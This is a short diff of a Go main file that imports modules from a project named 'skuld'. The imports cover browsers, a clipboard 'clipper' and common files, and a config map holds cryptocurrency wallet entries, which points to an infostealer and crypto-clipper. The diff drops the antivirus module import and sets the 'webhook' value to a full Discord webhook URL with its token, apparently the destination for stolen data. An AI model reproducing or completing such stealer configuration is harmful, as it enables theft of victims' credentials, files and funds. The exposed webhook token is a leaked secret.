@@ -1,7 +1,6 @@
 package main
 
 import (
-	"github.com/hackirby/skuld/modules/antivirus"
 	"github.com/hackirby/skuld/modules/browsers"
 	"github.com/hackirby/skuld/modules/clipper"
 	"github.com/hackirby/skuld/modules/commonfiles"
@@ -21,7 +20,7 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://discord.com/api/webhooks/1340428388313202770/jsgOdHMVdClcnv_kkJw6lKSEAHtWzcmmXoOlAYdEbiNQUwgdnYe1ho4KVkCgFOGWOJOA",
 		"cryptos": map[string]string{
 			"BTC": "",
 			"BCH": "",
